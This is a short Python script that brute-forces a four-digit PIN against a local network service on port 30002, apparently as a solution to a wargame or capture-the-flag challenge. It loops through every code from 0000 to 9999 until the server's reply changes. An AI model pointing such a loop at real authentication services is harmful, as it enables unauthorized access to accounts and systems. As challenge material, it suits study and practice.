import sys
import socket

pin = 0
password = ""
try:
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 30002))

    # Print welcome message
    welcome_msg = s.recv(2048)
    print(welcome_msg)
    # Try brute-forcing
    while pin < 10000:
        pin_string = str(pin).zfill(4)
        message = password + " " + pin_string + "\n"
        # Send message
        s.sendall(message.encode())
        receive_msg = s.recv(1024)
        # Check result
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pin_string)
        else:
            print(receive_msg)
            break
        pin += 1
finally:
    sys.exit(1)